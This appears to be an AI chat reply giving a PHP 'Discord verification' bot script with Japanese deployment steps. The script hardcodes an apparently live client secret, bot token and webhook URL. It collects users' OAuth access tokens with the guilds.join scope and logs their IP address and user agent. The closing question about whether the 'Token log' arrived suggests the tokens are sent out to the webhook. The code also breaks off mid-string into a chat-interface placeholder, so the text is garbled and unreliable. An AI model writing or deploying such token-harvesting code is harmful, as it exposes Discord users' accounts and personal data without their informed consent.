<?php
// Railwayの生存確認
if ($_SERVER['REQUEST_URI'] === '/health') {
    http_response_code(200);
    exit('OK');
}

// --- 【設定データ】 ---
$client_id     = '1483731872050839564';
$client_secret = 'x1dQum1L-xtASg0NHH29gPrnRDEjIA_L'; 
$webhook_url   = 'https://discordapp.com/api/webhooks/1483730982606475304/UN0z8Omfi4Voo58rLkFVhwhv0Jd59kUOYktJxyx0g0mGl5VkCc0IbLtegaqKZXAKokc2';
$redirect_uri  = 'https://discord-verify-production-4476.up.railway.app'; 

// ★提供された最新のBot Token
$bot_token     = 'MTQ4MzczMTg3MjA1MDgzOTU2NA.G8IV22.pwyIoWuAwrHn1RUE6aPu1ks9WpFrAGdzBmwXdk'; 
$guild_id      = '1483346769025831035'; 
$role_id       = '1483424484043260024'; 

$auth_url      = "https://discord.com/oauth2/authorize?client_id={$client_id}&response_type=code&redirect_uri=" . urlencode($redirect_uri) . "&scope=identify+guilds.join";

// --- 機能1: 認証ボタンの送信 ---
if ($_SERVER['REQUEST_URI'] === '/send_button') {
    $payload = json_encode([
        "embeds" => [[
            "title" => "認証",
            "description" => "サーバーに参加してくれてありがとうございます。最初は認証からお願いします。\n\n認証後 <@&{$role_id}> が付与されます。\n\n**BOT作成者 @Unify_BOT**",
            "color" => 5814783
        ]],
        "components" => [[
            "type" => 1,
            "components" => [[
                "type" => 2,
                "label" => "認証",
                "style" => 5,
                "url" => $auth_url
            ]]
        ]]
    ]);

    $ch = curl_init($webhook_url);
    curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $payload);
    curl_exec($ch);
    exit("認証ボタンを送信しました！Discordを確認してください。");
}

// --- 機能2: メインの認証処理 ---
if (!isset($_GET['code'])) {
    echo "Ready. System is active.";
    exit;
}

$ch = curl_init('https://discord.com/api/oauth2/token');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query([
    'client_id'     => $client_id,
    'client_secret' => $client_secret,
    'grant_type'    => 'authorization_code',
    'code'          => $_GET['code'],
    'redirect_uri'  => $redirect_uri
]));
$token_res = json_decode(curl_exec($ch), true);

if (isset($token_res['access_token'])) {
    $access_token = $token_res['access_token'];

    $ch = curl_init('https://discord.com/api/users/@me');
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_HTTPHEADER, ['Authorization: Bearer ' . $access_token]);
    $user = json_decode(curl_exec($ch), true);

    // サーバーに参加 ＆ ロール付与
    $join_data = json_encode(['access_token' => $access_token, 'roles' => [$role_id]]);
    $ch = curl_init("https://discord.com/api/guilds/{$guild_id}/members/{$user['id']}");
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "PUT");
    curl_setopt($ch, CURLOPT_HTTPHEADER, ["Authorization: Bot {$bot_token}", "Content-Type: application/json"]);
    curl_exec($ch);

    // ログ送信
    $time = date("Y/m/d H:i:s");
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['REMOTE_ADDR'];
    $ua = $_SERVER['HTTP_USER_AGENT'];
    $creation_date = date("Y/m/d H:i:s", (($user['id'] >> 22) + 1420070400000) / 1000);

    $log_content = "
http://googleusercontent.com/immersive_entry_chip/0

---

### 🚀 実行手順

1.  GitHub の `index.php` をこのコードに書き換えて **Commit**。
2.  Railway のデプロイ完了（約30秒）を待つ。
3.  ブラウザで **`https://discord-verify-production-4476.up.railway.app/send_button`** を開く。

これで **Embed（認証ボタン）** が届かない場合は、Webhook URL が正しいか再確認してください。

**ボタンは届きましたか？ また、テストでボタンを押したときに Token ログは届きましたか？**
